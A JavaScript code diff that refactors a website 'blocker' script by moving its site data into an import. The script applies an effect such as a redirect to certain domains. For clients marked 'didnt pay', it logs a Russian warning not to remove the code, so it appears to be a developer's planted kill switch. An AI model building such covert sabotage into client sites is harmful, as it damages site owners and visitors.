@@ -7,7 +7,7 @@
  */
 
 // Массив с найденными данными
-const siteArguments = siteInfo;
+import { siteInfo } from './bd.js';
 
 // Массив с эффектами
 const effects = {
@@ -51,17 +51,17 @@ const effects = {
   // Функция для проверки домена
   function checkDomain() {
 
-    console.log("Site Info:", siteArguments);
+    console.log("Site Info:", siteInfo);
 
     // Применение эффекта, если домен найден в списке
-    const effectFunction = effects[siteArguments.blocker_effect];
+    const effectFunction = effects[siteInfo.blocker_effect];
     if (effectFunction) {
-        effectFunction(siteArguments.blocker_redirecturl || siteArguments.blocker_date);
+        effectFunction(siteInfo.blocker_redirecturl || siteInfo.blocker_date);
     }
         
     // Проверка, если case у домена равен "didnt pay"
-    if (siteArguments && siteArguments.blocker_cause === "didnt pay") {
-        console.log(`Этот заказчик ${siteArguments.blocker_date} не оплатил заказанную работу, поэтому будь осторожен и не удаляй этот код. По всем вопросам пиши сюда \nTelegram Group → https://t.me/d3usn0tam`);
+    if (siteInfo && siteInfo.blocker_cause === "didnt pay") {
+        console.log(`Этот заказчик ${siteInfo.blocker_date} не оплатил заказанную работу, поэтому будь осторожен и не удаляй этот код. По всем вопросам пиши сюда \nTelegram Group → https://t.me/d3usn0tam`);
       }
   }
 
